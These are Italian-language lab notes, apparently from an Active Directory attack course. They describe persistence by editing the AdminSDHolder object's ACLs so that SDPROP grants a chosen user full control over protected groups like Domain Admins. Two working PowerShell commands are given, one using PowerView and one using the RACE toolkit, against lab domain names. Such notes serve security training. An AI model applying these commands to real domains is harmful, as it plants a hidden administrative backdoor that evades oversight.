# Persistence using ACLs - Editing AdminSDHolder1

* Con privilegi Domain Admin (Full Control/Write Permission) sull'oggetto AdminSDHolder, puo' essere usato come meccanismo di backdoor/persistenza aggiungendo un utente con Full Permissions ( o altri permessi interessanti) all'oggetto AdminSDHolder
* Dopo 60 minuti (quando SDPROP sara' eseguito) l'utente sara' aggiunto con Full control rispetto  ACL di gruppi come Domain Admins senza nemmeno esserne membri
* Aggiungere permessi Full Control per un utente nel AdminSDHelper utilizzando successivamente PowerView come Domain Admin

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-
dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -
Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain
dollarcorp.moneycorp.local -Verbose
```

* Utilizzando il RACE toolkit ([https://github.com/samratashok/RACE](https://github.com/samratashok/RACE))

```powershell
Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -
Right GenericAll -DistinguishedName
'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -
Verbose
```
